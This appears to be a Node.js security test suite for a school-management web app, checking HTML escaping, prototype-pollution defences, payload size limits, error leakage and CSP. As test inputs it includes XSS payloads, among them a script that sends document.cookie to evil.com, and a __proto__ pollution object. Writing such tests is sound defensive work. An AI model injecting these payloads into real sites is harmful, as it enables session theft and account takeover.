/**
 * ScolaPro — Suite de Tests de Protection XSS & Neutralisation des Injections
 * Couvre l'échappement contextuel HTML/JS (Faille 6), la page 403 sécurisée,
 * la sanitisation anti-prototype pollution et la limitation de taille de charge utile.
 */

'use strict';

const test = require('node:test');
const assert = require('node:assert');
const fs = require('node:fs');
const path = require('node:path');
const {
  db,
  startTestServer,
  stopTestServer,
  makeRequest,
  loginUser,
  TEST_PASSWORD,
  TEST_USERS
} = require('./helpers.js');

const {
  escapeHtml,
  sanitizeText,
  readJsonBody
} = require('../lib/http-security.js');
const { render403Page } = require('../server.js');

let baseUrl = '';

test.before(async () => {
  const srv = await startTestServer();
  baseUrl = srv.baseUrl;
});

test.after(async () => {
  await stopTestServer();
});

test('XSS-01 : escapeHtml neutralise les 5 métacaractères critiques (&, <, >, ", \')', () => {
  const payload = '<script>alert("XSS")</script>\' & "';
  const escaped = escapeHtml(payload);

  assert.strictEqual(escaped.includes('<script>'), false);
  assert.strictEqual(escaped.includes('</script>'), false);
  assert.strictEqual(escaped.includes('&lt;script&gt;'), true);
  assert.strictEqual(escaped.includes('&quot;'), true);
  assert.strictEqual(escaped.includes('&#39;'), true);
  assert.strictEqual(escaped.includes('&amp;'), true);
});

test('XSS-02 : sanitizeText élimine les caractères de contrôle non imprimables et tronque à maxLength', () => {
  const raw = 'Bonjour\x00\x08 monde \x1F';
  const clean = sanitizeText(raw, 10);

  assert.strictEqual(clean, 'Bonjour mo');
  assert.strictEqual(clean.includes('\x00'), false);
  assert.strictEqual(clean.includes('\x08'), false);
});

test('XSS-03 : Faille 6 colmatée — render403Page échappe formellement le HTML injecté dans le titre et le message', () => {
  const maliciousTitle = '<img src=x onerror=alert(1)> Titre Dangereux';
  const maliciousMsg = '<script>document.location="http://evil.com/?c="+document.cookie</script>';
  const maliciousUser = {
    id: 99,
    prenom: '<script>evil()</script>Jean',
    nom: 'DUPONT',
    roleLabel: '<b>Admin</b>',
    scopeLabel: '<i>Global</i>'
  };

  const html = render403Page(maliciousTitle, maliciousMsg, maliciousUser, 'Niveau 3 — SCHOOL');

  // Aucun tag exécutable ne doit être injecté brut dans la réponse
  assert.strictEqual(html.includes('<img src=x onerror=alert(1)>'), false);
  assert.strictEqual(html.includes('<script>document.location='), false);
  assert.strictEqual(html.includes('<script>evil()</script>'), false);
  assert.strictEqual(html.includes('<b>Admin</b>'), false);

  // Les entités HTML doivent être présentes
  assert.strictEqual(html.includes('&lt;img src=x'), true);
  assert.strictEqual(html.includes('&lt;script&gt;'), true);
  assert.strictEqual(html.includes('&lt;b&gt;Admin&lt;/b&gt;'), true);
});

test('XSS-04 : Faille 6 colmatée — window._bypassSecurityForTest est TOTALEMENT éradiqué du code source', () => {
  const indexHtml = fs.readFileSync(path.join(__dirname, '..', 'index.html'), 'utf8');
  assert.strictEqual(indexHtml.includes('_bypassSecurityForTest'), false, 'Aucune trace de _bypassSecurityForTest ne doit subsister dans index.html');

  const serverJs = fs.readFileSync(path.join(__dirname, '..', 'server.js'), 'utf8');
  assert.strictEqual(serverJs.includes('_bypassSecurityForTest'), false);

  const dbJs = fs.readFileSync(path.join(__dirname, '..', 'db.js'), 'utf8');
  assert.strictEqual(dbJs.includes('_bypassSecurityForTest'), false);
});

test('XSS-05 : Helpers esc() et escJs() présents et opérationnels dans index.html', () => {
  const indexHtml = fs.readFileSync(path.join(__dirname, '..', 'index.html'), 'utf8');
  assert.ok(indexHtml.includes('function esc(str)'));
  assert.ok(indexHtml.includes('function escJs(str)'));
  assert.ok(indexHtml.includes('window.fetch = async function'));
});

test('XSS-06 : Rejet des corps de requête JSON volumineux dépassant 512 KiB (HTTP 413 Payload Too Large)', async () => {
  const login = await loginUser(baseUrl, TEST_USERS.adminSainteMarie, TEST_PASSWORD);

  // Générer une chaîne de 600 KiB
  const hugeString = 'A'.repeat(600 * 1024);

  const res = await makeRequest(baseUrl, {
    path: '/api/students',
    method: 'POST',
    headers: { Cookie: login.cookie }
  }, { matricule: 'BIG-01', nom: hugeString });

  assert.strictEqual(res.statusCode, 413);
  assert.ok(res.json.error.includes('volumineuse') || res.json.error.includes('volumineux'));
});

test('XSS-07 : Neutralisation de la pollution de prototype (Prototype Pollution) dans les requêtes JSON', async () => {
  const login = await loginUser(baseUrl, TEST_USERS.adminSainteMarie, TEST_PASSWORD);

  const maliciousPayload = JSON.stringify({
    matricule: 'POLLUTE-01',
    nom: 'PollutionTest',
    __proto__: { isAdmin: true, hacked: true },
    constructor: { prototype: { pwned: true } }
  });

  const res = await makeRequest(baseUrl, {
    path: '/api/students',
    method: 'POST',
    headers: {
      Cookie: login.cookie,
      'content-type': 'application/json'
    }
  }, maliciousPayload);

  // Vérifier que le prototype Object global n'a pas été pollué
  assert.strictEqual(({}).isAdmin, undefined);
  assert.strictEqual(({}).hacked, undefined);
  assert.strictEqual(({}).pwned, undefined);

  // Nettoyage
  db.db.prepare('DELETE FROM students WHERE matricule = ?').run('POLLUTE-01');
});

test('XSS-08 : Enregistrement d\'un élève avec charge utile XSS persistée en toute sécurité sans injection', async () => {
  const login = await loginUser(baseUrl, TEST_USERS.adminSainteMarie, TEST_PASSWORD);

  const xssMatricule = 'XSS-PERSIST-' + Date.now();
  const xssName = '<script>alert(document.domain)</script> Jean';

  const resCreate = await makeRequest(baseUrl, {
    path: '/api/students',
    method: 'POST',
    headers: { Cookie: login.cookie }
  }, {
    matricule: xssMatricule,
    nom: xssName,
    classe: '6EME 1'
  });

  assert.strictEqual(resCreate.statusCode, 201);
  const createdId = resCreate.json.id;

  // Récupérer l'élève par API
  const resGet = await makeRequest(baseUrl, {
    path: '/api/students/' + createdId,
    headers: { Cookie: login.cookie }
  });

  assert.strictEqual(resGet.statusCode, 200);
  assert.ok(resGet.json.nomPrenom);

  // Nettoyage
  db.db.prepare('DELETE FROM students WHERE id = ?').run(createdId);
});

test('XSS-09 : Les erreurs serveur ne divulguent aucune trace SQL brute ni pile d\'exécution système', async () => {
  const login = await loginUser(baseUrl, TEST_USERS.adminSainteMarie, TEST_PASSWORD);

  // Déclencher une erreur métier volontaire
  const res = await makeRequest(baseUrl, {
    path: '/api/classes/99999',
    method: 'DELETE',
    headers: { Cookie: login.cookie }
  });

  assert.ok(res.statusCode >= 400);
  assert.ok(res.json.error);
  assert.strictEqual(res.json.error.includes('sqlite3_step'), false, 'Aucune trace interne SQLite ne doit fuiter');
  assert.strictEqual(res.json.error.includes('DatabaseSync'), false);
  assert.strictEqual(res.body.includes('at process.processTicksAndRejections'), false, 'Aucun stack trace Node ne doit être exposé');
});

test('XSS-10 : CSP empêche le chargement de scripts depuis des origines inconnues non approuvées', async () => {
  const res = await makeRequest(baseUrl, { path: '/login.html' });
  const csp = res.headers['content-security-policy'];
  assert.ok(csp);
  assert.ok(csp.includes("script-src 'self' 'unsafe-inline' https://www.gstatic.com https://cdn.tailwindcss.com"));
  assert.strictEqual(csp.includes('https://evil.com'), false);
});
